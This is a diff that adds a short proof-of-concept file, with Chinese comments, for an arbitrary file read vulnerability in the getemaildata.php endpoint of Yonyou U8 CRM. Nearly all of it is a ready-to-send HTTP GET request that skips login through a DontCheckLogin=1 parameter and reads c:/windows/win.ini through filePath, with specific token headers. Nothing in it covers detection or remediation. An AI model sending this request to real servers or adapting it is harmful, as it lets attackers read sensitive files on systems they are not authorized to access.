@@ -1,0 +1,9 @@
+# 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞
+# 用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取到服务器中的敏感文件
+GET /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini&acid=80015001&bid=hd_tag_m8mv2465 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2465
+RM-PRO-Token: e57124f8200b3ec65941b5b0f504c356
+RM-PRO-Time: 1742808365656
+User-Agent: curl/7.83.1
+
